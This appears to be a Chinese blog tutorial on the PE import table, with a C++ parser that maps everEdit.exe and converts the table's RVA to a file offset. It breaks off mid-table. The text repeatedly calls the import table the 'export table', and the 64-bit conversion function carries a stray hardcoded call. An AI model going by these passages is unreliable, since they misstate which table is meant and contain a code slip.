<h4 id="什么是导出表"><a href="#什么是导出表" class="headerlink" title="什么是导出表"></a>什么是导出表</h4><p>导出表是用于记录该PE文件还需要依赖的模块以及依赖这些模块中的那些函数的一种结构</p>
<h4 id="如何定位导入表"><a href="#如何定位导入表" class="headerlink" title="如何定位导入表"></a>如何定位导入表</h4><p><strong>定位导入表的原理</strong></p>
<p>根据之前所学可知，导入、导出等表的起始位置和大小都存放在了IMAGE_OPTIONAL_HEADERS结构的DataDirectory数组当中。而导入表对应的下标为1</p>
<table>
<thead>
<tr>
<th align="left">宏定义</th>
<th align="left">值</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">IMAGE_DIRECTORY_ENTRY_IMPORT</td>
<td align="left">1</td>
<td align="left">导入表</td>
</tr>
</tbody></table>
<p>定位导入表流程</p>
<ol>
<li>找到扩展PE头IMAGE_OPTIONAL_HEADERS的最后一个成员DataDirectory[1]</li>
<li>根据DataDirectory[1].VirtualAddress 得到导入表的RVA</li>
<li>将导入表的RVA转为FOA，在文件中定位到导入表</li>
</ol>
<h3 id="根据流程定位导入表"><a href="#根据流程定位导入表" class="headerlink" title="根据流程定位导入表"></a>根据流程定位导入表</h3><h4 id="分析demo"><a href="#分析demo" class="headerlink" title="分析demo"></a>分析demo</h4><p>使用everEdit.exe</p>
<h4 id="找到DataDirectory-1"><a href="#找到DataDirectory-1" class="headerlink" title="找到DataDirectory[1]"></a>找到DataDirectory[1]</h4><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015152622826.png" alt="image-20211015152622826"></p>
<p>根据索引，我们找到DataDirectory[1]即第二个表导出表的数据目录</p>
<table>
<thead>
<tr>
<th>iMAGE_data_directory成员</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAddress</td>
<td>0x001CF47C</td>
<td>导出表的RVA地址</td>
</tr>
<tr>
<td>Size</td>
<td>0x00000140</td>
<td>导出表的大小</td>
</tr>
</tbody></table>
<h4 id="得到导出表的RVA"><a href="#得到导出表的RVA" class="headerlink" title="得到导出表的RVA"></a>得到导出表的RVA</h4><p>导出表的RVA即0x001CF47C</p>
<p>修改VA转FOA程序代码，求出导出表FOA</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER *dos,_IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew+<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);        </span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">				<span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x1CF47C</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\everEdit.exe&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic) &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**) <span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&lt; nt-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER)*cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x11320</span>,dos,nt,sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此代码本是将VA转为FOA值，但由于VA = ImageBase + RVA，我们可以修改增加一句关键代码使其RVA转FOA</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x1CF47C</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015153401402.png" alt="image-20211015153401402"></p>
<p>拿到导出表文件偏移FOA:0x10720</p>
<p>完成定位</p>
<h4 id="导入表结构"><a href="#导入表结构" class="headerlink" title="导入表结构"></a>导入表结构</h4><h4 id="导入表个数"><a href="#导入表个数" class="headerlink" title="导入表个数"></a>导入表个数</h4><p>与导出表不同，导入表通常需要包含多个模块，而不像导出表只需要提供PE文件需要提供的导出函数即可</p>
<p>因此，导出表只有一个，但导入表可能会有多个</p>
<p>当程序运行时，需要依赖几个模块，就有对应几个导出表</p>
<p>导出表的结构体</p>
<p>在C语言中，导出表的结构如下(在winnt.h中有定义)</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015154327762.png" alt="image-20211015154327762"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">成员</th>
<th align="left">数据宽度</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Characteristics</td>
<td align="left">DWORD</td>
<td align="left">标志为0表示结束，没有导入描述符了</td>
</tr>
<tr>
<td align="left">OriginalFirstThunk</td>
<td align="left">DWORD</td>
<td align="left">RVA指向IMAGE_THUNK_DATA结构数组 （桥1）</td>
</tr>
<tr>
<td align="left">TimeDateStamp</td>
